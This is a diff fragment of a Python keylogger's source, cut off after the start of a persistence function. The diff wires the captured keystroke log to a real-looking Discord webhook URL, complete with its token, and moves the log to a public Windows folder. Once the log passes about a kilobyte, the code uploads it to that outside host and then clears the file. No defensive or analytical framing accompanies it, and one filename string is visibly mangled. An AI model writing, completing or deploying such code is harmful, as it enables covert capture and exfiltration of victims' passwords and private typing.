@@ -21,15 +21,15 @@ def log_keystroke(key):
     if key == "key.cmd":
         key = ' [WINKEY] '
 
-    with open("log.txt", 'a') as f:
+    with open("C:\\Users\\Public\\log.txt", 'a') as f:
         f.write(key)
-    size = os.path.getsize("log.txt") / 1000
+    size = os.path.getsize("C:\\Users\\Public\\log.txt") / 1000
     if size > 1:
-        webhook = DiscordWebhook(url='webhookhere', username="KeyLogger data", content="KeyLogger log file: ")
-        with open("log.txt", "rb") as f:
-            webhook.add_file(file=f.read(), filename='log.txt')
+        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/805008211995787285/fXfGRNZXubCFltykjp-SPtXtHazXamvDaHHBh1caKAy9CyOSa-4IehtZFFTu0rot0q7M', username="KeyLogger data", content="KeyLogger log file: ")
+        with open("C:\\Users\\Public\\log.txt", "rb") as f:
+            webhook.add_file(file=f.read(), filename='lC:\\Users\\Public\\og.txt')
         response = webhook.execute()
-        open('log.txt', 'w').close()
+        open('C:\\Users\\Public\\log.txt', 'w').close()
 
 def make_persistance():
     try:
